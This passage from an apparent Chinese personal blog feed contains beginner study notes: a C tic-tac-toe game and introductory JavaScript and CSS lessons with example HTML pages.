main() &#123;    float a = 0;    float b = 0;    float c = 0;    int n = 0;    scanf(&quot;%d;%f,%f,%f&quot;, &amp;n, &amp;a, &amp;b, &amp;c);    printf(&quot;The each subject score of No. %d is %.2f, %.2f, %.2f.&quot;, n, test(a),           test(b), test(c));    return 0;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/12/qKVIzAuPmN6Jntb.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> OJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三子棋</title>
      <link href="/2023/03/11/%E4%B8%89%E5%AD%90%E6%A3%8B/"/>
      <url>/2023/03/11/%E4%B8%89%E5%AD%90%E6%A3%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><pre><code class="C">#pragma once//符号的定义#define ROW 3#define COL 3#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;//函数的声明//初始化棋盘void InitBoard(char board[ROW][COL], int row, int col);//打印棋盘void DisplayBoard(char board[ROW][COL],int row,int col);//玩家下棋void PlayerMove(char board[][COL], int row, int col);//电脑下棋void ComputerMove(char board[ROW][COL], int row, int col);//1.玩家赢了-*//2.电脑赢了-#//3.平局-Q//4.游戏继续-C//判断是否赢游戏char IsWin(char board[ROW][COL], int row, int col);//判断是否继续游戏int IsFull(char board[ROW][COL], int row, int col);</code></pre><h1 id="函数实现"><a href="#函数实现" class="headerlink" title="函数实现"></a>函数实现</h1><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS 1#include &quot;game.h&quot;void InitBoard(char board[ROW][COL], int row, int col)&#123;    int i = 0;    int j = 0;    for (i = 0; i &lt; row; i++)    &#123;        for (j = 0; j &lt; col; j++)        &#123;            board[i][j] = &#39; &#39;;        &#125;    &#125;&#125;void DisplayBoard(char board[ROW][COL], int row, int col)&#123;    int i = 0;    for (i = 0; i &lt; row; i++)    &#123;        int j = 0;        for (j = 0; j &lt; col; j++)        &#123;            printf(&quot; %c &quot;, board[i][j]);            if (j &lt; col - 1)                printf(&quot;|&quot;);        &#125;        printf(&quot;\n&quot;);        if (i &lt; row - 1)        &#123;            int j = 0;            for (j = 0; j &lt; col; j++)            &#123;                printf(&quot;---&quot;);                if(j &lt; col-1)                    printf(&quot;|&quot;);            &#125;            printf(&quot;\n&quot;);        &#125;    &#125;&#125;void PlayerMove(char board[][COL], int row, int col)&#123;    int x = 0;    int y = 0;    printf(&quot;玩家走:&gt;\n&quot;);    printf(&quot;请输入下棋的坐标:&gt;&quot;);    scanf(&quot;%d %d&quot;, &amp;x, &amp;y);    //判断坐标合法性    while (1)    &#123;        if (x &gt;= 1 &amp;&amp; x &lt;= row &amp;&amp; y &gt;= 1 &amp;&amp; y &lt;= col)        &#123;            //下棋            //判断坐标是否被占用            if (board[x - 1][y - 1] == &#39; &#39;)            &#123;                board[x - 1][y - 1] = &#39;*&#39;;                break;            &#125;            else            &#123;                printf(&quot;坐标被占用,请重新输入\n&quot;);                break;            &#125;        &#125;        else        &#123;            printf(&quot;坐标非法，请重新从输入\n&quot;);            break;        &#125;            &#125;&#125;void ComputerMove(char board[ROW][COL], int row, int col)&#123;    printf(&quot;电脑走:&gt;\n&quot;);    while (1)    &#123;        int x = rand() % row;        int y = rand() % col;        //判断占用        if (board[x][y] == &#39; &#39;)        &#123;            board[x][y] = &#39;#&#39;;            break;        &#125;    &#125;&#125;char IsWin(char board[ROW][COL], int row, int col)&#123;    int i = 0;    //判断三行    for (i = 0; i &lt; row; i++)    &#123;        if (board[i][0] == board[i][1] &amp;&amp; board[i][1] == board[i][2] &amp;&amp; board[i][1] != &#39; &#39;)            return board[i][1];    &#125;    //判断三列    for (i = 0; i &lt; col; i++)    &#123;        if (board[0][i] == board[1][i] &amp;&amp; board[1][i] == board[2][i] &amp;&amp; board[1][i] != &#39; &#39;)            return board[1][i];    &#125;    //判断对角    if (board[0][0] == board[1][1] &amp;&amp; board[1][1] == board[2][2] &amp;&amp; board[0][0] != &#39; &#39;)    &#123;        return board[1][1];    &#125;    if (board[0][2] == board[1][1] &amp;&amp; board[1][1] == board[2][0] &amp;&amp; board[0][0] != &#39; &#39;)    &#123;        return board[1][1];    &#125;    //判断平局    //如果满返回1.不满返回0    int ret = IsFull(board,row,col);    if (ret == 1)    &#123;        return &#39;Q&#39;;    &#125;    //继续    else    &#123;        return &#39;C&#39;;    &#125;&#125;int IsFull(char board[ROW][COL], int row, int col)&#123;    int i = 0;    int j = 0;    for (i = 0; i &lt; row; i++)    &#123;        for (j = 0; j &lt; col; j++)        &#123;            if (board[i][j] == &#39; &#39;)                return 0;            else                return 1;        &#125;    &#125;&#125;</code></pre><h1 id="界面实现"><a href="#界面实现" class="headerlink" title="界面实现"></a>界面实现</h1><pre><code class="C">#define _CRT_SECURE_NO_WARNINGS 1#include &quot;game.h&quot;void menu()&#123;    printf(&quot;********************************\n&quot;);    printf(&quot;*******     1.play     *********\n&quot;);    printf(&quot;*******     0.exit     *********\n&quot;);    printf(&quot;********************************\n&quot;);&#125;void game()&#123;    //存储数据-二维数组（棋盘）    char board[ROW][COL];    //初始化棋盘-初始化空格    InitBoard(board, ROW, COL);    //打印棋盘    DisplayBoard(board,ROW,COL);    char ret = IsWin(board, ROW, COL);    while (1)    &#123;        //玩家下棋        PlayerMove(board, ROW, COL);        DisplayBoard( board, ROW, COL);        ret = IsWin(board, ROW, COL);        if (ret != &#39;C&#39;)            break;        //电脑下棋        ComputerMove(board, ROW, COL);        DisplayBoard(board, ROW, COL);    &#125;    if (ret == &#39;*&#39;)    &#123;        printf(&quot;玩家赢\n&quot;);    &#125;    else if (ret == &#39;#&#39;)    &#123;        printf(&quot;电脑赢\n&quot;);    &#125;    else    &#123;        printf(&quot;电脑赢了\n&quot;);    &#125;    DisplayBoard(board, ROW, COL);&#125;int main()&#123;    int input = 0;    srand((unsigned int)time(NULL));    do    &#123;        menu();        printf(&quot;请选择:&gt;&quot;);        scanf(&quot;%d&quot;, &amp;input);        switch (input)        &#123;        case 1:            game();            printf(&quot;三子棋游戏\n&quot;);            break;        case 0:            printf(&quot;退出游戏\n&quot;);            break;        default:            printf(&quot;选择错误，重新选择\n&quot;);            break;        &#125;    &#125; while (input);    return 0;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript学习笔记</title>
      <link href="/2023/03/09/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/09/JavaScript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript概述"><a href="#JavaScript概述" class="headerlink" title="JavaScript概述"></a>JavaScript概述</h1><ol><li>简称js</li><li>一种脚本语言，脚本语言的特点<br> java语言是一种脚本语言<br> JavaScript的目标程序是以普通文本的形式保存，用记事本可以直接打开的</li><li>JavaScript和JScript的关系</li><li>JavaScript主要用来操作HTML中的节点，产生动态效果</li><li>JavaScript和Java的区别<br> JavaScript运行在浏览器中，浏览器中有JS代码的内核<br> Java运行在JVM中，JavaScript和JAVA没有任何关系<br> Java语言是SUN公司开发的，JavaScript这个名字是SUN公司给起的名<br> JavaScript是一门编程语言，专门用来操作HTML页面中的节点，让王爷产生动态效果的，JavaScript中也有变量，数据类型等</li></ol><h1 id="JavaScript-包括三块：ECMAScript、DOM、BOM"><a href="#JavaScript-包括三块：ECMAScript、DOM、BOM" class="headerlink" title="JavaScript 包括三块：ECMAScript、DOM、BOM"></a>JavaScript 包括三块：ECMAScript、DOM、BOM</h1><ol><li>ECMAScript是ECMA制定的262标准，JavaScript和Jscript都遵守这个标准，ECMAScript是JavaScript核心语法</li><li>DOM编程时通过JavaScript对HTML中的dom节点进行操作，DOM时有规范的，DOM规范时W3C制定的。</li><li>BOM编程是对浏览器本身操作，例如：前进、后退、地址栏、关闭窗口、弹窗等。由于浏览器由不同的厂家制造，所以BOM缺少规范，一般只是有一个默认的行业规范。（Brower Object Model，浏览器对象类型）</li></ol><h1 id="JavaScript-嵌入JS三种方式以及JS的注释"><a href="#JavaScript-嵌入JS三种方式以及JS的注释" class="headerlink" title="JavaScript 嵌入JS三种方式以及JS的注释"></a>JavaScript 嵌入JS三种方式以及JS的注释</h1><h2 id="3-1-行间事件"><a href="#3-1-行间事件" class="headerlink" title="3.1 行间事件"></a>3.1 行间事件</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;在HTML中嵌入JS代码的第一种方式：行间事件&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--            1、需求：用户点击以下这个按钮，弹出一个对话框，对话框上显示：hello world            2、JavaScript是一种事件驱动型的编程语言，通常都是在发生某个事件的时候，去执行            某段代码。其中事件包括很多，例如：鼠标单击事件click，另外还有其它事件，例如：            mouseover是鼠标经过事件等。并且在JavaScript当中任何一个事件都有对应的事件句柄。            例如：click对应的事件句柄是onclick，mouseover对应的事件句柄是onmouseover。            3、所有的事件句柄都是以标签的属性形式存在。例如以下input button就有一个onclick这样属性。            只要有用户点击了以下的这个按钮对象，此时按钮对象上发生了鼠标单击事件，那么注册在            onclick事件句柄当中的JS代码会被执行！onclick后面代码实际上是浏览器负责执行的。            4、onclick=&quot;后面的代码&quot;并不是在浏览器打开的时候执行，浏览器打开的时候，只是将这个代码            注册给onclick事件句柄了。等待该按钮的click事件发生，只要发生，后面代码会被事件监听器            调用。            5、怎么使用JS代码弹窗？                在JS当中有一个内置的BOM对象，可以直接拿来使用，全部小写：window                其中window对象有一个方法/函数叫做alert，这个函数专门用来弹出对话框！                        6、window.alert(&#39;hello world!&#39;); 弹窗的JS代码。                通过这个代码可以知道：JS中的字符串可以使用单引号括起来，也可以使用双引号。                JS中的一条语句可以“;”结尾，也可以不以“;”结尾。        --&gt;        &lt;input type=&quot;button&quot; value=&quot;hello1&quot; onclick=&quot;window.alert(&#39;hello world!&#39;);&quot;/&gt;        &lt;input type=&quot;button&quot; value=&quot;hello2&quot; onclick=&#39;window.alert(&quot;hello world!&quot;)                                                     window.alert(&quot;hello kitty&quot;)                                                     window.alert(&quot;你好,中国!&quot;)&#39;/&gt;        &lt;!-- window. 可以省略 --&gt;        &lt;input type=&quot;button&quot; value=&quot;hello3&quot; onclick=&quot;alert(&#39;hello world!&#39;);&quot;/&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="出了点问题：在用sublime-text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。"><a href="#出了点问题：在用sublime-text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。" class="headerlink" title="出了点问题：在用sublime text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。"></a>出了点问题：在用sublime text编辑时，好像格式有要求，他会有引号不匹配，但换成HBuilder又行了，不懂怎么回事。</h3><h2 id="3-2-脚本块方式"><a href="#3-2-脚本块方式" class="headerlink" title="3.2 脚本块方式"></a>3.2 脚本块方式</h2><pre><code class="HTML">&lt;!-- 脚本块的位置随意，没有限制！ --&gt;&lt;script type=&quot;text/javascript&quot;&gt;    alert(&quot;page begin&quot;)&lt;/script&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;在HTML中嵌入JS代码的第二种方式：脚本块的方式&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;                &lt;!-- 这个按钮会先被加载到浏览器内存。 --&gt;        &lt;input type=&quot;button&quot; value=&quot;按钮1&quot; /&gt;                &lt;!-- 脚本块 --&gt;        &lt;!-- 一个页面中脚本块可以出现多个！ --&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            /* 在这里直接编写JS代码，这些JS代码在页面打开的时候自上而下的顺序依次逐行执行！ */            //alert(&quot;hello world&quot;); // 单行注释            alert(&quot;hello zhangsan&quot;);            alert(&quot;hello lisi&quot;);                        /*                多行注释            */        &lt;/script&gt;                &lt;!-- 最后加载这个按钮2 --&gt;        &lt;input type=&quot;button&quot; value=&quot;按钮2&quot; /&gt;            &lt;/body&gt;&lt;/html&gt;&lt;script type=&quot;text/javascript&quot;&gt;    alert(&quot;page end!&quot;)&lt;/script&gt;</code></pre><h2 id="3-3-引入外部独立的JS文件"><a href="#3-3-引入外部独立的JS文件" class="headerlink" title="3.3 引入外部独立的JS文件"></a>3.3 引入外部独立的JS文件</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;在HTML中嵌入JS的第三种方式：引入外部独立的JS文件&lt;/title&gt;                &lt;!-- 引入外部独立的CSS文件。这个标签link中属性是href --&gt;        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;&quot;/&gt;    &lt;/head&gt;    &lt;body&gt;                &lt;!-- 引入外部独立的js文件 --&gt;        &lt;!-- script标签引入js文件的时候，是src属性，不是href。 --&gt;        &lt;script type=&quot;text/javascript&quot; src=&quot;js/1.js&quot;&gt;&lt;/script&gt;                &lt;!-- 引入第二次，这个操作没有意义，测试结果：只要引入一次JS文件，JS文件中的代码就会全部执行一遍 --&gt;        &lt;script type=&quot;text/javascript&quot; src=&quot;js/1.js&quot;&gt;&lt;/script&gt;                &lt;script type=&quot;text/javascript&quot; src=&quot;js/1.js&quot;&gt;            //alert(&quot;hello world!~~~~~&quot;); // 这里的代码不会执行！        &lt;/script&gt;                &lt;!-- 单独的脚本块 --&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            alert(&quot;hello world!%%%%%%%%&quot;);        &lt;/script&gt;            &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="文件代码"><a href="#文件代码" class="headerlink" title="文件代码"></a>文件代码</h3><pre><code class="JavaScript">/* 这是一堆JS代码，这些JS代码在HTML引入的时候，遵循自上而下的顺序依次逐行执行的！ */alert(&quot;hello world&quot;)alert(&quot;hello kitty&quot;)</code></pre><h1 id="关于各种注释"><a href="#关于各种注释" class="headerlink" title="关于各种注释"></a>关于各种注释</h1><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;关于各种注释&lt;/title&gt;                &lt;style type=&quot;text/css&quot;&gt;            /* CSS的注释 */        &lt;/style&gt;            &lt;/head&gt;    &lt;body&gt;        &lt;!-- 这是HTML的注释 --&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            /* 这是javascript注释，多行 */            // 这是javascript注释,单行        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h1 id="标识符和关键字"><a href="#标识符和关键字" class="headerlink" title="标识符和关键字"></a>标识符和关键字</h1><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;标识符和关键字&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script type=&quot;text/javascript&quot;&gt;                        /* 标识符命名规则和命名规范按照java那一套来就行！ */            /*                以下这段代码是JS的for循环，找出其中的关键字和标识符？                    关键字：var、for                    标识符：i、alert                                标识符命名规则：                    标识符只能由数字、字母、下划线、美元符号组成，不能含有其它特殊符号                    标识符不能以数字开始                    标识符严格区分大小写                    关键字不能做标识符                    标识符理论上没有长度限制                                标识符命名规范？                    .....            */            for(var i = 0; i &lt; 10; i++)&#123;                alert(&quot;i = &quot; + i)            &#125;                    &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;JS的变量&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            /*                回顾Java中的变量？                    怎么声明？                        int i;                        double d;                        String s;                    怎么赋值？                        i = 100;                        d = 3.14;                        s = &quot;abc&quot;;                    一行上能声明多个变量吗？                        int a, b, c = 300;                        a b c都是int类型。                        a和b没有赋值。                        c赋值300                                        重点：Java语言是一种强类型语言，有编译阶段，属于编译型语言。                        Java语言在编译阶段确定变量的数据类型，也就是说程序还没有                        运行呢，变量的数据类型就已经确定了，并且该变量的数据类型                        在这一生中，永远不可变。                            int x = 1200;【x = true; java的编译器会报错。不让这样做。语法不对！】                            double d = x;                             这行代码表示x的变量中保存的值1200给d变量                            x变量还是int类型，d变量是double类型。一生不变。                                    JS的变量？                    怎么声明？                        var 变量名;                        var i;                    怎么赋值？                        变量名 = 值;                        i = 100;                    一行上能声明多个变量吗？                        var a, b, c = 300;                        声明3个变量，a b c，并且c赋值300，其中a和b变量没有赋值，系统默认赋值undefined                        undefined 在JS中一个具体的值，这个值就是 undefined                                        重点：JS语言是一种弱类型语言，没有编译阶段，直接浏览器打开解释执行，                    在JS中声明变量时不需要指定变量的数据类型，程序在运行过程当中，赋什么                    类型的值，变量就是什么数据类型，并且变量的数据类型是可变的。                        var i;                        i = 100; 到这里i是整数型                        i = false; 到这里i就是布尔类型了                        i = true;                        i = 3.14;                        i = new Object();            */           var i;           alert(i) // 变量只声明没有赋值,系统默认赋值undefined, 在JS当中undefined是一个具体存在的值.                      var x = &quot;undefined&quot;;           alert(x) // &quot;undefined&quot;这个不是undefined,它是一个字符串.                      // 声明时,同时赋值           var k = 100;           alert(k + 1) // 101                      k = false;           alert(k);                      k = &quot;abc&quot;;           alert(k)                      // 一行上可以声明多个变量           //var是一个关键字,就是用来声明变量的,variables单词的前3个字母.           var a, b, c = 100;           alert(a) // undefined           alert(b) // undefined           alert(c) // 100                   &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;函数初步&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script type=&quot;text/javascript&quot;&gt;                        //alert(122222);                        /*                回顾Java中的方法：                    [修饰符列表] 返回值类型 方法名(形式参数列表)&#123;                        方法体;                    &#125;                    例如：                        public static int sum(int a,int b)&#123;                            return a + b;                        &#125;                                        JavaScript当中的函数：                    函数定义的语法格式是什么？                        function 函数名(形式参数列表)&#123;                            函数体;                        &#125;                        例如：                            function sum(a, b)&#123;                                return a + b;                            &#125;                                                    函数名：sum                            形式参数列表是：a和b  (a和b都是变量名！)                                                JS中的函数返回值类型是不需要指定的，因为可以返回任何类型的数据。没有限制。                                关于JS的的调试？                    首选方案是：alert()，在程序的某个位置先使用alert弹出某个变量的值，看看是否是你需要的。                    通过alert可以调试JS代码。                                        另外一种方案是：采用浏览器自带的调试插件，F12                        F12这个插件中比较重要的面板：                            控制台                            查看器                            网络                            掌握以上三个面板！！！！！！！！！！！！            */           /* function sum(a, b)&#123;                          &#125; */                      // 函数必须调用才会执行.           function sum(x, y)&#123;               alert(x + &quot;,&quot; + y);               //alert(&quot;sum函数执行了！&quot;);           &#125;                      //这一切都是因为js是一门弱类型语言!           sum(&quot;abc&quot;, false);                      // 调用sum函数           sum();                      // 调用sum函数           sum(1);                      // 调用sum函数           sum(1,2);                      // 调用sum函数           sum(1,2,3);                      /* JS的函数还有另一种声明方式？*/           /* function mysum(a, b)&#123;                          &#125; */                      //效果相同           mysum = function(a, b)&#123;               return a + b; //返回计算结果!           &#125;                      // 调用函数           var result = mysum(10, 20);           alert(result)                      //定义一个函数           function sayHello(username)&#123;               alert(&quot;欢迎&quot; + username + &quot;光临！&quot;)           &#125;                   &lt;/script&gt;                &lt;!-- 在事件句柄当中调用sayHello函数 --&gt;        &lt;input type=&quot;button&quot; value=&quot;hello&quot; onclick=&quot;sayHello(&#39;李四&#39;)&quot; /&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS学习笔记</title>
      <link href="/2023/03/07/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/07/CSS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="承接HTML学习笔记"><a href="#承接HTML学习笔记" class="headerlink" title="承接HTML学习笔记"></a>承接HTML学习笔记</h1><p>附上动力节点网课视频</p><h2 id="CSS概述和在HTML中嵌入CSS样式的三种方式"><a href="#CSS概述和在HTML中嵌入CSS样式的三种方式" class="headerlink" title="CSS概述和在HTML中嵌入CSS样式的三种方式"></a>CSS概述和在HTML中嵌入CSS样式的三种方式</h2><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;CSS概述&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1&gt;什么是CSS？&lt;/h1&gt;        &lt;p&gt;            &amp;nbsp;  CSS:Cascading Style Sheet(层叠样式语言).CSS是一种样式表语言。专门用来修饰HTML页面的。让HTML页面更好看。            &lt;br&gt;            &amp;nbsp;  CSS是HTML的化妆品.CSS是离不开HTML的，CSS离开了HTML就没有意义了，所以还是新建HTML文件，编写HTML代码，HTML代码中编写央视，修饰HTML节点。        &lt;/p&gt;        &lt;br&gt;        &lt;h2&gt;在HTML嵌入CSS样式的第一种方式&lt;/h2&gt;        &lt;p&gt;            &lt;!--内联定义--&gt;            &lt;!--盒子--&gt;            &lt;!--                内联定义的语法格式：                    &lt;标签 style=&quot;样式名：样式值;样式名：样式值&quot;&gt;&lt;/标签&gt;                    样式可通过查找帮助文档来获取            --&gt;            &lt;div id=&quot;div1&quot; style=&quot;width: 100px;height: 100px;background-color: #66FF66;&quot;&gt;                            &lt;/div&gt;        &lt;/p&gt;        &lt;h2&gt;在HTML嵌入CSS样式的第二种方式&lt;/h2&gt;        &lt;p&gt;            &lt;!--样式块对象--&gt;            &lt;style type=&quot;text/css&quot;&gt;                /* 这是CSS的注释*(与HTML不同) */                /* 设置id=&quot;div2&quot;元素的宽度高度和颜色 */                /*                    设置某个元素的样式，首先你要选中这个元素，怎么选中一个或多个元素呢？                        常见的选择元素的方式有三种：（这里说的是常见的）                            id选择器                            标签选择器                            类选择器                */                /* 关于id选择器 */                /* id选择器只能作用于当前页面的一个节点，因为id是不能重复的 */                #div2 &#123;                    width: 100px;                    height: 100px;                    background-color: greenyellow;                &#125;                /* 标签选择器 */                /* 作用于当前页面中所有的input元素 */                input &#123;                    width: 100px;                    height: 10px;                    /* border-color: red;                    border-style: dashed;                    border-width: 1px; */                    /* 总样式 */                    border: 1px solid black;/* 宽度 样式 颜色 */                &#125;                /* id选择器的优先级比标签选择器高 */                #email &#123;                    border: 20px dashed red;                &#125;                /* 类选择器 */                .student &#123;                    width: 200px;                    height: 30px;                    background-color: #0000FF;                &#125;                /* 以上三种选择器的优先级                    id选择器&gt;类选择器&gt;标签选择器 */            &lt;/style&gt;            &lt;div id=&quot;div2&quot; type=&quot;text/css&quot;&gt;&lt;/div&gt;            &lt;br&gt;            用户名&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;            &lt;br&gt;            &lt;br&gt;            密码&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;            &lt;br&gt;&lt;br&gt;&lt;br&gt;            邮箱地址：&lt;input id=&quot;email&quot; type=&quot;text&quot; name=&quot;&quot; /&gt;            &lt;br&gt;&lt;br&gt;&lt;br&gt;            &lt;!-- 在HTML中，任何一个节点元素都有class属性，用来指定标签类名--&gt;            &lt;!--以下虽然标签不同，但是它们的都属于同一类。为什么？因为类名相同--&gt;            &lt;input class=&quot;student&quot; type=&quot;text&quot; /&gt;            &lt;br&gt;&lt;br&gt;&lt;br&gt;            &lt;input class=&quot;student&quot; type=&quot;text&quot; name=&quot;&quot; /&gt;            &lt;br&gt;&lt;br&gt;&lt;br&gt;            &lt;div class=&quot;student&quot;&gt;3&lt;/div&gt;        &lt;/p&gt;        &lt;h2&gt;在HTML嵌入CSS样式的第三种方式&lt;/h2&gt;        &lt;!--引入外部独立的CSS样式表文件--&gt;        &lt;!--实际开发中较多使用这种方式，可以降低维护成本，修改一个文件即可--&gt;        &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;C:/Users/yxz/Desktop/css/my.css&quot; /&gt;        &lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;        &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>附.css文件代码</p><pre><code class="CSS">#div1 &#123;    width: 300px;    height: 300px;    background: #ADFF2F;    border: 1px solid black;    position: absolute; /* 绝对定位 */    /* 绝对定位的时候只要设置x轴和y轴坐标即可 */    top: 200px;    left: 500px;&#125;#div2 &#123;    width: 200px;    height: 200px;    background: red;    border: 1px solid black;    position: absolute; /* 绝对定位 */    top: 300px;    left: 600px;&#125;&#125;</code></pre><p><img src="https://s2.loli.net/2023/03/07/AH8Xvk5FiMraCQL.png" alt="css.png"></p><h3 id="常见CSS样式"><a href="#常见CSS样式" class="headerlink" title="常见CSS样式"></a>常见CSS样式</h3><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;        &lt;title&gt;常用的CSS样式&lt;/title&gt;        &lt;!--样式块--&gt;        &lt;style type=&quot;text/css&quot;&gt;            .numbers&#123;                display: none; /*  block */                 /*                     display样式                        1.属于布局样式                        2.用来设置显示或者隐藏                        3.隐藏：none                        4.显示：block或者inline-bloc                            block：以块的形式展现，并且独自占用一行                            inline-block：以块的形式展现，但是不会自己独自占用一行                */            &#125;            #nameError &#123;                font-size: 12px;                color: red;            &#125;            .baidu &#123;                text-decoration: none;/* underline */            &#125;            #cc &#123;                list-style-type: noen;            &#125;            /* :hover专门用来设置鼠标悬停效果的 */            /*使用hover的时候:俩边不能出现空格*/            #bgpowernode:hover&#123;                color: red;                cursor: pointer;            &#125;            .div5 &#123;                width: 300px;                height: 300px;                background-color: #444;                border: 34px red solid;                /* 在元素外边打补丁 */                margin-top: 10px;                margin-left: 100px;                /* 内补丁 */                padding-right: 100px;            &#125;            #outdiv &#123;                width: 300px;                height: 300px;                background-color: blue;                float: right;            &#125;            #innerdiv &#123;                width: 100px;                height: 100px;                background-color: red;                /* 设置当前节点元素的浮动效果，只是浮动于当前元素的父元素内部 */                float: right;            &#125;            #mydiv2 &#123;                width: 100px;                height: 100px;                background-color: red;                /* 绝对定位 */                position: absolute;                top: 0px;                left: 100px;            &#125;        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;!--设置鼠标悬停效果--&gt;        &lt;!--鼠标移动到以下文本上，字体颜色变红，鼠标变小手--&gt;        &lt;span id=&quot;bgpowernode&quot;&gt;柚子皮&lt;/span&gt;        &lt;!--无序列表--&gt;        &lt;ul id=&quot;cc&quot;&gt;            &lt;li&gt;a                &lt;ul class=&quot;numbers&quot;&gt;                    &lt;li&gt;1&lt;/li&gt;                    &lt;li&gt;2&lt;/li&gt;                    &lt;li&gt;3&lt;/li&gt;                &lt;/ul&gt;            &lt;/li&gt;            &lt;li&gt;b                &lt;ul class=&quot;numbers&quot;&gt;                    &lt;li&gt;1&lt;/li&gt;                    &lt;li&gt;2&lt;/li&gt;                    &lt;li&gt;3&lt;/li&gt;                &lt;/ul&gt;            &lt;/li&gt;            &lt;li&gt;c                &lt;ul class=&quot;numbers&quot;&gt;                     &lt;li&gt;1&lt;/li&gt;                    &lt;li&gt;2&lt;/li&gt;                    &lt;li&gt;3&lt;/li&gt;                &lt;/ul&gt;            &lt;/li&gt;        &lt;/ul&gt;        &lt;!--字体样式--&gt;        &lt;span id=&quot;nameError&quot;&gt;用户名不能为空&lt;/span&gt;        &lt;br&gt;&lt;br&gt;        &lt;!--文本装饰--&gt;        &lt;a class=&quot;baidu&quot; href=&quot;http:www.baidu.com&quot;&gt;百度&lt;/a&gt;        &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;        &lt;!--内补丁，外补丁--&gt;        &lt;div class=&quot;div5&quot;&gt;&lt;/div&gt;        &lt;!--浮动效果--&gt;        &lt;div id=&quot;outdiv&quot;&gt;            &lt;div id=&quot;innerdiv&quot;&gt;            &lt;/div&gt;        &lt;/div&gt;        &lt;div id=&quot;mydiv2&quot;&gt;&lt;/div&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://s2.loli.net/2023/03/09/VpQUdCGtHbAniZ8.png" alt="image.png"></p><h3 id="暂停于此"><a href="#暂停于此" class="headerlink" title="暂停于此"></a>暂停于此</h3>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C的笔记</title>
      <link href="/2023/03/05/C%E7%9A%84%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/05/C%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
      
